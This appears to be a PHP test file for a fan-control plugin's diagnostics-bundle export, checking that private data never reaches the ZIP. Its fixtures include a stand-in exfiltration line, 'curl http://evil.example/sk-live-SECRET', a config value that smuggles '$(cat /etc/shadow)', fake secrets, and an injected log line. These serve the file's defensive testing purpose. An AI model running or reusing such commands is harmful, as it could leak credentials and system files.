<?php
$module = __DIR__.'/../src/usr/local/emhttp/plugins/fanctrlplus2/include/Diagnostics.php';
if (!is_file($module)) { fwrite(STDERR, "Diagnostics implementation is missing.\n"); exit(1); }
require_once $module;
$root = sys_get_temp_dir().'/fcp_diag_'.getmypid();
mkdir($root, 0700, true);
putenv("FCP_CONFIG_LOCK=$root/.config.lock");
$failures = [];
$check = function ($condition, string $message) use (&$failures) { if (!$condition) $failures[] = $message; };
// Key order is not part of the contract.
$canon = function ($value) use (&$canon) {
    if (!is_array($value)) return $value;
    $value = array_map($canon, $value);
    if (!array_is_list($value)) ksort($value);
    return $value;
};
$same = fn($a, $b) => $canon($a) === $canon($b);
$put = function (string $path, string $text) { @mkdir(dirname($path), 0777, true); file_put_contents($path, $text); };

$unzip = function (string $bytes) use ($root): array {
    $path = "$root/bundle.zip";
    file_put_contents($path, $bytes);
    $zip = new ZipArchive();
    if ($zip->open($path) !== true) throw new RuntimeException('Invalid ZIP');
    $files = [];
    for ($i = 0; $i < $zip->numFiles; $i++) {
        $name = $zip->getNameIndex($i);
        $files[$name] = $zip->getFromIndex($i);
    }
    $zip->close();
    unlink($path);
    return $files;
};

// ---- Fixture: a configuration directory full of things that must never leave. ----
$cfg = "$root/plugins/fanctrlplus2";
$ctrl = "$root/sys/devices/platform/nct6775.656/hwmon/hwmon5/pwm1";
$identity = 'usb:'.bin2hex(json_encode(['3904', 'f001', '2080376E4548', '/interface:1.0/0003:3904:F001.*/hwmon/hwmon*/pwm10']));
$secretFan = <<<'CFG'
custom="Secret_Fan_Name"
label="Rack 7 private label"
service="1"
controller="{CTRL}"
controller_identity="{IDENTITY}"
pwm="102"
max="255"
idle="30"
interval_sec="60"
disk_group_count="1"
disk_group_0_name="Customer \$ Archive"
disk_group_0_disks="ata_WDC_WD40EFRX-68N32N0_WD-WCC7K1234567,ata_ST8000DM004-2CX188_ZR12SERIAL"
disk_group_0_curve="30:60,50:120,60:255"
disk_group_0_curve_mode="stepped"
disk_group_0_hysteresis="3"
disk_group_0_emergency_temp="55"
disk_group_0_emergency_pwm="255"
syslog="1"
notify="1"
cpu_enable="1"
cpu_sensor="/sys/devices/platform/coretemp.0/hwmon/hwmon2/temp1_input"
cpu_curve="40:80,70:200"
cpu_curve_mode="linear"
cpu_hysteresis="2"
cpu_emergency_temp=""
cpu_emergency_pwm="255"
aux_enable="1"
aux_sensor="custom:rack_ambient_sensor,custom:missing_sensor,/sys/devices/pci0000:00/0000:00:01.0/hwmon/hwmon3/temp1_input,nvidia:gpu0"
aux_curve="35:60,45:140"
aux_curve_mode="linear"
aux_hysteresis="0"
aux_emergency_temp=""
aux_emergency_pwm="255"
secret_note="password=hunter2"
CFG;
$legacyFan = <<<'CFG'
custom="Legacy"
service="0"
controller="/sys/devices/platform/gone.1/hwmon/hwmon9/pwm4"
pwm="102"
max="255"
idle_percent="10"
interval="2"
low="40"
high="60"
disks="ata_LEGACY_SERIAL999"
cpu_enable="0"
cpu_min_temp=""
aux_enable="0"
aux_sensor=""
CFG;
$put("$cfg/fanctrlplus2_Secret_Fan_Name.cfg", str_replace(['{CTRL}', '{IDENTITY}'], [$ctrl, $identity], $secretFan)."\n");
$put("$cfg/fanctrlplus2_Legacy.cfg", $legacyFan."\n");
$put("$cfg/fanctrlplus2_Broken.cfg", "custom=\"\$(cat /etc/shadow)\"\n");
$put("$cfg/fanctrlplus2_temp_0.cfg", "custom=\"Unsaved_Secret\"\n");
$put("$cfg/pwm_labels.cfg", "$identity=My Private Label\n__FCP_HISTORY__=1\n");
$put("$cfg/order.cfg", "order0=\"fanctrlplus2_Secret_Fan_Name.cfg\"\n");
$put("$cfg/sensors.d/rack_ambient_sensor", "#!/bin/sh\necho 37 # token=sk-live-SECRET\n");
$put("$cfg/sensors.d/other_script", "curl http://evil.example/sk-live-SECRET\n");
$put("$cfg/sensors.d/.hidden", "x");
mkdir("$cfg/sensors.d/nested");
$put("$root/plugins/fanctrlplus2.plg", "<?xml version='1.0'?>\n<PLUGIN\n  name=\"fanctrlplus2\"\n  version=\"2026.11.08\"\n>\n");
$put("$cfg/fanctrlplus2_A bad name.cfg", "custom=\"PRIVATE\"\n");
$put("$cfg/fanctrlplus2_backup.old.cfg", "custom=\"PRIVATE\"\n");

// Two chips: one good, one whose name and values are hostile text.
$chip5 = "$root/sys/devices/platform/nct6775.656/hwmon/hwmon5";
$chip12 = "$root/sys/devices/pci0000:00/0000:00:1f.3/hwmon/hwmon12";
foreach (['name'=>"nct6775\n", 'pwm1'=>"102\n", 'pwm1_enable'=>"1\n", 'pwm1_mode'=>"1\n", 'fan1_input'=>"1100\n",
    'pwm2'=>"hunter2-SECRET\n", 'fan2_input'=>"-1\n", 'pwm3'=>"999\n", 'fan3_input'=>"0\n", 'unrelated_label'=>"SECRET-LABEL\n"] as $file => $text) $put("$chip5/$file", $text);
foreach (['name'=>"evil chip; password=hunter2\n", 'pwm1'=>"255\n", 'fan1_input'=>"450\n", 'temp1_label'=>"SECRET-LABEL\n"] as $file => $text) $put("$chip12/$file", $text);
@mkdir("$root/sys/class/hwmon", 0777, true);
symlink($chip5, "$root/sys/class/hwmon/hwmon5");
symlink($chip12, "$root/sys/class/hwmon/hwmon12");
// A directory whose name is not hwmonN is never enumerated.
$put("$root/sys/class/hwmon/hwmonSECRET/pwm1", "100\n");
$put("$root/module/parameters/fan_config", "msi_alt1\n");
$put("$root/module/parameters/msi_fan_brute_force", "Y\n");

$ok = 'Nov 10 12:00:0%d tower-private-host fanctrlplus2: ';
$syslog = implode("\n", [
    sprintf($ok, 0).'[Secret_Fan_Name] Temp=45°C (CPU) → PWM=120 → RPM=900',
    sprintf($ok, 1).'Manual Run [Secret_Fan_Name] Temp=*°C  → PWM=102 → RPM=?',
    sprintf($ok, 2).'[Secret_Fan_Name] Temp=39°C (Disk: Customer Archive) → PWM=90 → RPM=800',
    sprintf($ok, 3).'[Unconfigured_Customer_Fan] Temp=41°C (Aux) → PWM=70 → RPM=500',
    sprintf($ok, 4).'[Secret_Fan_Name] Could not write PWM=130 to '.$ctrl.'; keeping the previous output and trying again.',
    sprintf($ok, 5).'Started [Legacy] from /boot/config/plugins/fanctrlplus2/fanctrlplus2_Legacy.cfg',
    sprintf($ok, 6).'All fanctrlplus2 stopped',
    sprintf($ok, 6).'Stopped control of pwm4; set to 50% (manual mode) to ensure sufficient airflow and avoid overheating',
    sprintf($ok, 6).'Manual Run [Secret_Fan_Name]: Failed to write PWM=200 to /secret/path.',
    sprintf($ok, 6).'[Secret_Fan_Name] Temp=45°C (CPU) → PWM=120 → RPM=',
    sprintf($ok, 7).'[Secret_Fan_Name] Curve state unavailable; continuing fan control with in-memory state.',
    '2026-11-10T12:00:08+00:00 tower-private-host fanctrlplus2[4242]: [Secret_Fan_Name] Temp=*°C (Idle) → PWM=60 → RPM=700',
    // Everything below must be dropped except the valid CRLF event.
    'Nov 10 12:01:00 tower-private-host fanctrlplus2: [Secret_Fan_Name] Temp=45°C (CPU) → PWM=120 → RPM=900 password=hunter2-SECRET',
    'Nov 10 12:01:01 tower-private-host fanctrlplus2: [Secret_Fan_Name] Temp=999°C (CPU) → PWM=120 → RPM=900',
    'Nov 10 12:01:02 tower-private-host fanctrlplus2: [Secret_Fan_Name] Temp=45°C (CPU) → PWM=300 → RPM=900',
    'Nov 10 12:01:03 tower-private-host sshd[99]: Accepted password for root from 192.168.7.7 fanctrlplus2: x',
    'Nov 10 12:01:04 tower-private-host kernel: fanctrlplus2: [Secret_Fan_Name] Temp=45°C (CPU) → PWM=121 → RPM=901',
    'Nov 10 12:01:05 tower-private-host fanctrlplus2: [Secret_Fan_Name] Temp=45°C (CPU) → PWM=122 → RPM=902'."\r",
    'Nov 10 12:01:06 tower-private-host fanctrlplus2: Started [Secret_Fan_Name] from /boot/x password=hunter2-SECRET',
    'Nov 10 12:01:07 tower-private-host fanctrlplus2: [Secret_Fan_Name] Temp=45°C (Disk: '.str_repeat('A', 2000).') → PWM=124 → RPM=904',
    "Nov 10 12:01:08 tower-private-host fanctrlplus2: injected\nsecret-continuation hunter2-SECRET",
    // Prose in the origin is discarded: only the source enum survives.
    'Nov 10 12:01:09 tower-private-host fanctrlplus2: [Secret_Fan_Name] Temp=45°C (Disk: ata_WDC_SERIAL123) → PWM=123 → RPM=903',
    '',
]);
$put("$root/syslog", $syslog);

$zip = fcp_diagnostics_zip($cfg, "$root/sys/class/hwmon/hwmon*", "$root/syslog", "$root/module");
$files = $unzip($zip);
$names = array_keys($files); sort($names);
$check($names === ['README.txt', 'events.json', 'fans.json', 'hardware.json', 'manifest.json'], 'The bundle must hold exactly the five documented files.');
$unzipBin = '/usr/bin/unzip';
if (is_executable($unzipBin)) {
    file_put_contents("$root/out.zip", $zip);
    exec($unzipBin.' -tq '.escapeshellarg("$root/out.zip").' 2>&1', $out, $status);
    $check($status === 0, 'An independent unzip must accept the archive: '.implode(' ', $out));
}
$json = fn(string $name) => json_decode($files[$name], true, 512, JSON_THROW_ON_ERROR);
$fans = $json('fans.json'); $hardware = $json('hardware.json'); $events = $json('events.json')['events']; $manifest = $json('manifest.json');

// ---- Useful data survives. ----
$check($manifest['format'] === 'fanctrlplus2-diagnostics' && $manifest['version'] === 1 && $manifest['plugin_version'] === '2026.11.08'
    && preg_match('/^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ$/D', $manifest['generated_utc']), 'The manifest must identify format, plugin version and time.');
$check(count($fans['fans']) === 3 && $fans['custom_sensor_scripts'] === 2 && $fans['skipped_configs'] === 2, 'Badly named files must not prevent diagnostics and must be counted.');
[$broken, $legacy, $secret] = $fans['fans'];
$check($broken === ['index'=>0, 'parsed'=>false], 'A configuration that fails to parse must be reported as unparsed and nothing else.');
$check($same(array_intersect_key($secret, array_flip(['service','pwm','max','idle','interval_sec','disk_group_count','syslog','notify','cpu_enable','aux_enable'])),
    ['service'=>1, 'pwm'=>102, 'max'=>255, 'idle'=>30, 'interval_sec'=>60, 'disk_group_count'=>1, 'syslog'=>1, 'notify'=>1, 'cpu_enable'=>1, 'aux_enable'=>1]), 'Numeric fan settings must be reported.');
$check($secret['disk_groups'] === [['disks'=>2]] && !array_key_exists('disks', $secret), 'Disks are counted per group, never identified.');
$check($secret['cpu_sensor_configured'] === true
    && $secret['aux_sensors'] === ['hwmon'=>1, 'custom'=>2, 'storcli'=>0, 'nvidia'=>1, 'mlx'=>0, 'other'=>0]
    && $secret['custom_sensors_missing'] === 1, 'Sensor configuration must be reported as counts by type, with missing custom scripts counted.');
$check($same($secret['controller'], ['hwmon'=>'hwmon5', 'chip'=>'nct6775', 'pwm'=>1, 'present'=>true, 'binding'=>'usb']), 'A saved controller must resolve to its anonymous hwmon channel.');
$check($same($secret['curves']['disk:0'], ['points'=>[[30,60],[50,120],[60,255]], 'mode'=>'stepped', 'hysteresis'=>3, 'emergency_temp'=>55, 'emergency_pwm'=>255])
    && $secret['curves']['cpu']['emergency_temp'] === null && $secret['curves']['aux']['points'] === [[35,60],[45,140]], 'Curves must be reported as validated numbers.');
$check(!array_key_exists('secret_note', $secret) && !array_key_exists('custom', $secret) && !array_key_exists('label', $secret), 'Keys outside the allowlist must not appear.');
$check($legacy['service'] === 0 && $legacy['idle_percent'] === 10 && $legacy['interval'] === 2 && $legacy['disks'] === 1 && $legacy['disk_groups'] === []
    && $same($legacy['controller'], ['present'=>false, 'pwm'=>4, 'binding'=>'path'])
    && $legacy['curves']['disk:0']['points'] === [[40,102],[60,255]], 'A legacy fan must report its effective ramp and an unresolved controller as a channel number only.');

$check($same($hardware['chips'], [
    ['id'=>'hwmon5', 'chip'=>'nct6775', 'channels'=>[
        ['channel'=>1, 'pwm'=>102, 'enable'=>1, 'mode'=>1, 'rpm'=>1100],
        ['channel'=>2, 'pwm'=>null, 'enable'=>null, 'mode'=>null, 'rpm'=>null],
        ['channel'=>3, 'pwm'=>null, 'enable'=>null, 'mode'=>null, 'rpm'=>0],
    ]],
    ['id'=>'hwmon12', 'chip'=>null, 'channels'=>[['channel'=>1, 'pwm'=>255, 'enable'=>null, 'mode'=>null, 'rpm'=>450]]],
]), 'Hardware must report valid PWM/mode/RPM and drop hostile names and out-of-range values.');
$check($same($hardware['nct6687'], ['loaded'=>true, 'fan_config'=>'msi_alt1', 'msi_fan_brute_force'=>'Y']), 'The nct6687 driver options must be reported.');
$watch = "$root/sys/class/hwmon/hwmon88";
$put("$watch/name", "nct6687\n");
$put("$watch/pwm3", "153\n");
$put("$watch/fan_control_watchdog", "0\n");
[$watchChips] = fcp_diag_hwmon("$watch");
$check($watchChips[0]['fan_control_watchdog_present'] === true, 'The nct6687 watchdog attribute provides evidence of brute-force support.');

$expected = [
    ['time'=>'Nov 10 12:00:00', 'type'=>'pwm_write', 'fan'=>2, 'manual'=>false, 'source'=>'cpu', 'temp_c'=>45, 'pwm'=>120, 'rpm'=>900],
    ['time'=>'Nov 10 12:00:01', 'type'=>'pwm_write', 'fan'=>2, 'manual'=>true, 'source'=>null, 'temp_c'=>null, 'pwm'=>102, 'rpm'=>null],
    ['time'=>'Nov 10 12:00:02', 'type'=>'pwm_write', 'fan'=>2, 'manual'=>false, 'source'=>'disk', 'temp_c'=>39, 'pwm'=>90, 'rpm'=>800],
    ['time'=>'Nov 10 12:00:03', 'type'=>'pwm_write', 'fan'=>null, 'manual'=>false, 'source'=>'aux', 'temp_c'=>41, 'pwm'=>70, 'rpm'=>500],
    ['time'=>'Nov 10 12:00:04', 'type'=>'pwm_write_failed', 'fan'=>2, 'pwm'=>130],
    ['time'=>'Nov 10 12:00:05', 'type'=>'started', 'fan'=>1],
    ['time'=>'Nov 10 12:00:06', 'type'=>'stopped_all'],
    ['time'=>'Nov 10 12:00:06', 'type'=>'stopped_control', 'channel'=>4],
    ['time'=>'Nov 10 12:00:06', 'type'=>'manual_failed', 'fan'=>2],
    ['time'=>'Nov 10 12:00:06', 'type'=>'pwm_write', 'fan'=>2, 'manual'=>false, 'source'=>'cpu', 'temp_c'=>45, 'pwm'=>120, 'rpm'=>null],
    ['time'=>'Nov 10 12:00:07', 'type'=>'curve_state_unavailable', 'fan'=>2],
    ['time'=>'2026-11-10T12:00:08', 'type'=>'pwm_write', 'fan'=>2, 'manual'=>false, 'source'=>'idle', 'temp_c'=>null, 'pwm'=>60, 'rpm'=>700],
    ['time'=>'Nov 10 12:01:05', 'type'=>'pwm_write', 'fan'=>2, 'manual'=>false, 'source'=>'cpu', 'temp_c'=>45, 'pwm'=>122, 'rpm'=>902],
    ['time'=>'Nov 10 12:01:09', 'type'=>'pwm_write', 'fan'=>2, 'manual'=>false, 'source'=>'disk', 'temp_c'=>45, 'pwm'=>123, 'rpm'=>903],
];
$check($same($events, $expected), 'Only strictly matched log lines may become events, as numbers and enums: '.json_encode($events));
$longName = str_repeat('fan', 40);
$longEvent = sprintf($ok, 0).'['.$longName.'] Temp=39°C (Disk: '.str_repeat('group', 30).') → PWM=90 → RPM=800';
$longResult = fcp_diag_events($longEvent, [$longName=>3]);
$check(count($longResult) === 1 && $longResult[0]['fan'] === 3 && $longResult[0]['pwm'] === 90, 'Long fan and disk-group names must not erase useful events.');

// ---- Nothing private appears anywhere, and no string is free text. ----
$everything = implode("\n", $files);
foreach (['Secret_Fan_Name', 'Rack 7', 'private label', 'Customer', 'Archive', 'WDC', 'WD-WCC7K1234567', 'ZR12SERIAL', 'ST8000', 'LEGACY_SERIAL999',
    'rack_ambient_sensor', 'missing_sensor', 'other_script', 'sk-live-SECRET', 'evil.example', 'tower-private-host', '192.168.7.7', 'hunter2', 'password',
    '2080376E4548', $identity, 'My Private Label', 'Unconfigured_Customer_Fan', 'Unsaved_Secret', 'Legacy', 'Broken', 'shadow', 'SECRET-LABEL', 'evil chip',
    'ata_', 'injected', $root, '/sys/', '/boot', '/tmp', 'devices/platform', '.656', 'coretemp', 'pci0000'] as $secretText) {
    $check(strpos($everything, $secretText) === false, "Private text '$secretText' must never appear in the bundle.");
}
$allowed = ['linear', 'stepped', 'usb', 'path', 'hwmon5', 'hwmon12', 'nct6775', 'msi_alt1', 'Y', 'cpu', 'aux', 'disk', 'idle',
    'pwm_write', 'pwm_write_failed', 'started', 'stopped_all', 'stopped_control', 'manual_failed', 'curve_state_unavailable'];
$strings = function ($value) use (&$strings) {
    if (is_string($value)) return [$value];
    $found = [];
    foreach (is_array($value) ? $value : [] as $item) array_push($found, ...$strings($item));
    return $found;
};
foreach ($strings([$fans, $hardware, $events]) as $text) {
    $check(in_array($text, $allowed, true) || preg_match('/^(?:Nov \d\d \d\d:\d\d:\d\d|\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d)$/D', $text), "Free text must not reach the bundle: '$text'.");
}

// ---- Absent data degrades to an empty but valid bundle. ----
$empty = $unzip(fcp_diagnostics_zip("$root/none", "$root/none/hwmon*", "$root/none/syslog", "$root/none/module"));
$check($same(json_decode($empty['fans.json'], true), ['skipped_configs'=>0, 'custom_sensor_scripts'=>0, 'fans'=>[]])
    && json_decode($empty['hardware.json'], true) === ['chips'=>[], 'nct6687'=>['loaded'=>false, 'fan_config'=>null, 'msi_fan_brute_force'=>null]]
    && json_decode($empty['events.json'], true) === ['events'=>[]]
    && json_decode($empty['manifest.json'], true)['plugin_version'] === null, 'Absent configuration, hardware, driver and log must give empty sections, not an error.');

// ---- Unsafe input fails closed with a message that holds nothing private. ----
$outside = "$root/outside-secret.txt"; $put($outside, 'TOP-SECRET-CONTENT');
$unsafe = "$root/unsafe";
mkdir($unsafe); symlink($outside, "$unsafe/fanctrlplus2_Evil.cfg");
$linkedDir = "$root/linked-dir"; symlink($cfg, $linkedDir);
$skipped = $unzip(fcp_diagnostics_zip($unsafe, "$root/none/hwmon*", "$root/none/syslog", "$root/none/module"));
$check(json_decode($skipped['fans.json'], true)['skipped_configs'] === 1 && strpos(implode('', $skipped), 'TOP-SECRET') === false, 'A symlinked configuration is skipped without exposing its target.');
try { fcp_diagnostics_zip($linkedDir, "$root/none/hwmon*", "$root/none/syslog", "$root/none/module"); $check(false, 'A symlinked directory must be refused.'); }
catch (RuntimeException $error) {
    $check(strpos($error->getMessage(), $root) === false && strpos($error->getMessage(), 'TOP-SECRET') === false, 'An error message must not echo paths or contents.');
}

// ---- Log bounds. ----
$many = '';
for ($i = 0; $i < 1500; $i++) $many .= sprintf("Nov 10 12:00:00 h fanctrlplus2: [A] Temp=40°C (CPU) → PWM=%d → RPM=500\n", $i % 256);
$bounded = fcp_diag_events($many, []);
$check(count($bounded) === FCP_DIAG_MAX_EVENTS && end($bounded)['pwm'] === 1499 % 256, 'Events must be capped to the most recent entries.');
$put("$root/huge", "Nov 10 00:00:00 h fanctrlplus2: All fanctrlplus2 stopped\n".str_repeat("x\n", FCP_DIAG_MAX_LOG_BYTES)."Nov 10 23:59:59 h fanctrlplus2: All fanctrlplus2 stopped\n");
$tail = fcp_diag_log_tail("$root/huge");
$check(strlen($tail) === FCP_DIAG_MAX_LOG_BYTES && strpos($tail, '00:00:00') === false && strpos($tail, '23:59:59') !== false, 'Only the end of an oversized log may be read.');
$check(fcp_diag_log_tail("$root/missing") === '', 'A missing log reads as empty.');

exec('rm -rf '.escapeshellarg($root));
if ($failures) { fwrite(STDERR, implode("\n", $failures)."\n"); exit(1); }
echo "diagnostics tests passed\n";
